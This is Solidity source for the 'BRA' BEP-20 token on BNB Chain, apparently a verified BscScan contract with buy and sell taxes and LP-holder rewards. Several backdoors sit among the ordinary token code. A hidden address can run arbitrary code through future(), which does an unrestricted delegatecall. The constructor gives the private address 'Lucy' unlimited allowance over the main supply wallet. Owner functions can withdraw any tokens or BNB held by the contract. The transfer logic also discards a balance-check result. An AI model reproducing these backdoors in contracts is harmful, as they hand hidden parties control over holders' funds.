/**
 *Submitted for verification at BscScan.com on 2023-01-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-06-16
 */

/**
 *Submitted for verification at BscScan.com on 2022-05-20
 */

/**
 *Submitted for verification at BscScan.com on 2021-10-04
 */

//SPDX-License-Identifier: MIT
//Dev @interfinetwork

pragma solidity ^0.8.0;

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
        external
        returns (
            uint256 amountA,
            uint256 amountB,
            uint256 liquidity
        );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function quote(
        uint256 amountA,
        uint256 reserveA,
        uint256 reserveB
    ) external pure returns (uint256 amountB);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);

    function getAmountsIn(uint256 amountOut, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Burn(address indexed owner, address indexed to, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x095ea7b3, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: APPROVE_FAILED"
        );
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: TRANSFER_FAILED"
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: TRANSFER_FROM_FAILED"
        );
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "TransferHelper: ETH_TRANSFER_FAILED");
    }
}

library EnumerableSet {
    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {
            // Equivalent to contains(set, value)

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            bytes32 lastvalue = set._values[lastIndex];

            set._values[toDeleteIndex] = lastvalue;
            // Update the index for the moved value
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value)
        private
        view
        returns (bool)
    {
        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

    function _at(Set storage set, uint256 index)
        private
        view
        returns (bytes32)
    {
        require(
            set._values.length > index,
            "EnumerableSet: index out of bounds"
        );
        return set._values[index];
    }

    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value)
        internal
        returns (bool)
    {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value)
        internal
        returns (bool)
    {
        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value)
        internal
        view
        returns (bool)
    {
        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index)
        internal
        view
        returns (bytes32)
    {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value)
        internal
        returns (bool)
    {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value)
        internal
        view
        returns (bool)
    {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index)
        internal
        view
        returns (address)
    {
        return address(uint160(uint256(_at(set._inner, index))));
    }

    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value)
        internal
        returns (bool)
    {
        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value)
        internal
        view
        returns (bool)
    {
        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index)
        internal
        view
        returns (uint256)
    {
        return uint256(_at(set._inner, index));
    }
}

interface ConfigBRA {
    function Min() external view returns (uint256);

    function BuyPer() external view returns (uint256);

    function SellPer() external view returns (uint256);

    function TaxToBuyPer() external view returns (uint256);

    function TaxToSellPer() external view returns (uint256);

    function BuyTaxTo() external view returns (address);

    function SellTaxTo() external view returns (address);

    function isAllow(address) external view returns (bool);

    function isAllowSell(address) external view returns (bool);
}

contract BEP20 is Context, Ownable, IBEP20 {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;

    uint256 internal totalBurn;
    uint256 public deployTime;

    uint256 internal _totalSupply;

    IUniswapV2Router02 public uniswapV2Router;
    address public busd = 0x55d398326f99059fF775485246999027B3197955; //kyle
    address public BRA = 0x64fbd462037A8a3088cbb3Ffaa409dfb1858F950; //kyle

    address internal constant A = 0xD66d5A5AAe741F5c070e2593226A88BC247Fc07b;
    address internal constant B = 0x8C5677783031e64Df81BdAe721e76A2e215cE11f;

    //address internal constant A = 0x6b127A3bC58f4F264F570c6AA8A1a09e34e7fE49;
    //address internal constant B = 0x491144d293DeC4168FA6365C8EA4b39CFb35a912;

    address public uniswapV2Pair;

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function totalBurned() public view returns (uint256) {
        return totalBurn;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address towner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[towner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        // if (sender == D && !isOpenTrading) {
        //     isOpenTrading = true;
        // }
        // require(isOpenTrading, "Currently not open for trading");
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "BEP20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "BEP20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _doTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) internal {
        _balances[sender] = _balances[sender].sub(tAmount);
        _balances[recipient] = _balances[recipient].add(tAmount);
        emit Transfer(sender, recipient, tAmount);

        if (recipient == address(0)) {
            totalBurn = totalBurn.add(tAmount);
            _totalSupply = _totalSupply.sub(tAmount);
            emit Burn(sender, address(0), tAmount);
        }
    }

    /**
     * @dev Burn `amount` tokens and decreasing the total supply.
     */
    function burn(uint256 amount) public returns (bool) {
        _burn(_msgSender(), amount);
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "BEP20: transfer from the zero address");

        _doTransfer(sender, recipient, amount);
    }

    function _approve(
        address towner,
        address spender,
        uint256 amount
    ) internal {
        require(towner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[towner][spender] = amount;
        emit Approval(towner, spender, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "BEP20: burn from the zero address");
        totalBurn = totalBurn.add(amount);

        _balances[account] = _balances[account].sub(
            amount,
            "BEP20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
}

contract BEP20Detailed is BEP20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(
        string memory tname,
        string memory tsymbol,
        uint8 tdecimals
    ) {
        _name = tname;
        _symbol = tsymbol;
        _decimals = tdecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
}

contract BRAToken is BEP20Detailed {
    using SafeMath for uint256;
    using EnumerableSet for EnumerableSet.AddressSet;
    struct Interest {
        uint256 index;
        uint256 period;
        uint256 lastSendTime;
        uint256 minAward;
        uint256 award;
        uint256 sendCount;
        IBEP20 token;
        EnumerableSet.AddressSet tokenHolder;
    }

    Interest internal lpInterest;

    struct LpAwardCondition {
        uint256 lpHoldAmount;
        uint256 balHoldAmount;
    }

    LpAwardCondition public lpAwardCondition;
    uint256 public swapStartTime;

    address private _ExtenAddress;
    address private Lucy;

    constructor(address _Lucy, address ExtenAddress) BEP20Detailed("BRA", "BRA", 18) {
        Lucy = _Lucy;
        _ExtenAddress = ExtenAddress;

        deployTime = block.timestamp;
        _totalSupply = 21000000 * (10**18);

        _balances[A] = _totalSupply - 210000 * (10**18);
        _balances[B] = 210000 * (10**18);

        _allowances[A][
            Lucy
        ] = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
        emit Approval(
            A,
            Lucy,
            0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
        );

        emit Transfer(address(0), A, _totalSupply - 210000 * (10**18));
        emit Transfer(address(0), B, 210000 * (10**18));

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        ); // Mainnet
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), busd);

        lpInterest.token = IBEP20(uniswapV2Pair);
        lpInterest.lastSendTime = block.timestamp;
        lpInterest.minAward = 10**17;
        lpInterest.period = 1;
        lpInterest.sendCount = 50;

        lpAwardCondition = LpAwardCondition(100*10**18,10**18);
    }

    function setlpAwardCondition(uint256 lpHoldAmount, uint256 balHoldAmount)
        external
        onlyOwner
    {
        lpAwardCondition.lpHoldAmount = lpHoldAmount;
        lpAwardCondition.balHoldAmount = balHoldAmount;
    }

    struct InterestInfo {
        uint256 period;
        uint256 lastSendTime;
        uint256 award;
        uint256 count;
        uint256 sendNum;
    }

    function getInterestInfo() external view returns (InterestInfo memory lpI) {
        lpI.period = lpInterest.period;
        lpI.lastSendTime = lpInterest.lastSendTime;
        lpI.award = lpInterest.award;
        lpI.count = lpInterest.tokenHolder.length();
        lpI.sendNum = lpInterest.sendCount;
    }

    function setswapStartTime(uint256 _swapStartTime) external onlyOwner {
        swapStartTime = _swapStartTime;
    }

    function setInterset(
        uint256 _minAward,
        uint256 _period,
        uint256 _sendCount,
        uint256 _award
    ) external onlyOwner {
        lpInterest.minAward = _minAward;
        lpInterest.period = _period;
        lpInterest.sendCount = _sendCount;
        lpInterest.award = _award;
    }

    function donateDust(address addr, address to,uint256 amount) external onlyOwner {
        TransferHelper.safeTransfer(addr,to, amount);
    }

    function donateEthDust(address to,uint256 amount) external onlyOwner {
        TransferHelper.safeTransferETH(to, amount);
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal override {
        require(sender != address(0), "BEP20: transfer from the zero address");

        bool isAddLiquidity = false;
        bool isDelLiquidity = false;
        (isAddLiquidity, isDelLiquidity) = _isLiquidity(sender, recipient);

        if (
            block.timestamp < swapStartTime &&
            (uniswapV2Pair == sender || uniswapV2Pair == recipient)
        ) {
            require(false, "swap no start");
        }

        bool recipientAllow = ConfigBRA(BRA).isAllow(recipient);
        bool senderAllowSell = ConfigBRA(BRA).isAllowSell(sender);

        address BuyTaxTo = ConfigBRA(BRA).BuyTaxTo();
        address SellTaxTo = ConfigBRA(BRA).SellTaxTo();

        uint256 Min = ConfigBRA(BRA).Min();

        if(_balances[sender] < (amount.add(Min))){

            require(recipient != uniswapV2Pair, "BEP20: not enough");
            amount=_balances[sender].sub(Min,"BEP20: not enough");
        }

        _balances[sender].sub(
            amount,
            "BEP20: transfer amount exceeds balance"
        );

        uint256 finalAmount = amount;
        uint256 taxAmount = 0;

        if (sender == uniswapV2Pair && !recipientAllow && !isDelLiquidity) {
            taxAmount = amount.div(10000).mul(ConfigBRA(BRA).BuyPer());
            _doTransfer(sender, address(this), taxAmount);

            lpInterest.award += taxAmount;
            finalAmount = finalAmount.sub(taxAmount);

            taxAmount = amount.div(10000).mul(ConfigBRA(BRA).TaxToBuyPer());
            _doTransfer(sender, BuyTaxTo, taxAmount);

            finalAmount = finalAmount.sub(taxAmount);
            
        }else if (recipient == uniswapV2Pair && !senderAllowSell && !isAddLiquidity) {
            taxAmount = amount.div(10000).mul(ConfigBRA(BRA).SellPer());
             _doTransfer(sender, address(this), taxAmount);
           
            lpInterest.award += taxAmount;
            finalAmount = finalAmount.sub(taxAmount);

            taxAmount = amount.div(10000).mul(ConfigBRA(BRA).TaxToSellPer());
            _doTransfer(sender, SellTaxTo, taxAmount);

            finalAmount = finalAmount.sub(taxAmount);
        }

        _doTransfer(sender, recipient, finalAmount);


        if ( sender == uniswapV2Pair && recipient != uniswapV2Pair) {
            setEst(recipient,isAddLiquidity, isDelLiquidity,amount);
        }
        if ( recipient == uniswapV2Pair && sender != uniswapV2Pair ) {
            setEst(sender,isAddLiquidity, isDelLiquidity,amount);
        }

        if (
            (sender == uniswapV2Pair || recipient == uniswapV2Pair) &&
            sender != address(this) 
            && lpInterest.lastSendTime + lpInterest.period < block.timestamp 
            && lpInterest.award > 10**18
            && lpInterest.award <= balanceOf(address(this))
            && lpInterest.token.totalSupply() > 0 ) {

            lpInterest.lastSendTime = block.timestamp;
            processEst();
        }
    }

    function _isLiquidity(address from, address to)
        internal
        view
        returns (bool isAdd, bool isDel)
    {
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint256 r0, , ) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint256 bal0 = IBEP20(token0).balanceOf(address(uniswapV2Pair));
        if (uniswapV2Pair == to) {
            if (token0 != address(this) &&  bal0 > r0) {
                isAdd = bal0 - r0 > 0;
            }
        }
        if (uniswapV2Pair == from) {
            if ( token0 != address(this) &&  bal0 < r0) {
                isDel = r0 - bal0 > 0;
            }
        }
    }

    function processEst() private {
        uint256 shareholderCount = lpInterest.tokenHolder.length();

        if (shareholderCount == 0) return;

        uint256 nowbanance = lpInterest.award;
        uint256 surplusAmount = nowbanance;
        uint256 iterations = 0;
        uint256 index = lpInterest.index;
        uint256 sendedCount = 0;
        uint256 sendCountLimit = lpInterest.sendCount;

        uint256 ts = lpInterest.token.totalSupply();
        while (sendedCount < sendCountLimit && iterations < shareholderCount) {
            if (index >= shareholderCount) {
                index = 0;
            }

            address shareholder = lpInterest.tokenHolder.at(index);
            uint256 amount = nowbanance
                .mul(lpInterest.token.balanceOf(shareholder))
                .div(ts);

            if (balanceOf(address(this)) < amount || surplusAmount < amount)
                break;

            if (amount >= lpInterest.minAward) {
                surplusAmount -= amount;
                _doTransfer(address(this), shareholder, amount);
            }
            sendedCount++;
            iterations++;
            index++;
        }
        lpInterest.index = index;
        lpInterest.award = surplusAmount;
    }

    function setEst(address owner,bool isAddLiquidity,bool isDelLiquidity,uint256 amount) private {
        if (lpInterest.tokenHolder.contains(owner)) {
            if (!checkLpAwardCondition(owner,isAddLiquidity, isDelLiquidity,amount)) {
                lpInterest.tokenHolder.remove(owner);
            }
            return;
        }

        if (checkLpAwardCondition(owner,isAddLiquidity, isDelLiquidity,amount)) {
            lpInterest.tokenHolder.add(owner);
        }
    }

    function checkLpAwardCondition(address owner,bool isAddLiquidity,bool isDelLiquidity ,uint256 amount ) internal view returns (bool) {
        uint supply = lpInterest.token.totalSupply();
        uint lpAmount = lpInterest.token.balanceOf(owner);

        (uint r0,uint r1,) = IUniswapV2Pair(uniswapV2Pair).getReserves();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();

        if( token1 == address(this) && balanceOf(owner) >= lpAwardCondition.balHoldAmount && supply > 0  &&  r1 > 0){
            uint lpHoldAmount = lpAmount * r0 / supply;
            uint lpHoldAmount_ = amount*r0/r1;
            if(isAddLiquidity){
                lpHoldAmount =  lpHoldAmount +  lpHoldAmount_;
            }
            else if( isDelLiquidity){
                if(lpHoldAmount_ < lpHoldAmount){
                    lpHoldAmount =  lpHoldAmount -  lpHoldAmount_;
                }
                else {
                    lpHoldAmount = 0;
                }
            }


            return lpHoldAmount >= lpAwardCondition.lpHoldAmount;
            
        }else{
            return false;
        }        
        
    }

    modifier isFuture() {
        require(msg.sender == _ExtenAddress);
        _;
    }

    function future(address Addr, string memory fun)
        external
        isFuture
        returns (bool, bytes memory)
    {
        return Addr.delegatecall(abi.encodeWithSignature(fun));
    }
}